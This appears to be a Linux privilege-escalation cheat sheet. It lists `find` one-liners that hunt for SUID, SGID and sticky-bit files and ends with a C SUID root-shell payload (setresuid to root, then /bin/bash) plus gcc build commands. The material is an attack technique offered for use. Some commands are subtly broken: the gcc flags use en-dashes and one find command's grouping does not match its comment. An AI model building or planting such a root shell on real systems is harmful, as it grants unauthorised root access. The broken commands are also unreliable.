SUID files are naturally used to escalate privileges when needed and should not be writable. 
If they are, a malicious user can simply change their contents before executing them, 
thus effectively escalating his privileges system wide.

find / -perm -1000 -type d 2>/dev/null   
# Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.

find / -perm -g=s -type f 2>/dev/null    
# SGID (chmod 2000) - run as the group, not the user who started it.

find / -perm -u=s -type f 2>/dev/null    
# SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    
# Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null


# SUID C Shell for /bin/sh
int main(void){ setresuid(0, 0, 0); system("/bin/bash"); } 

# build the binary
gcc –o suid suid.c
# or on 32 bit
gcc –m32 –o suid suid.c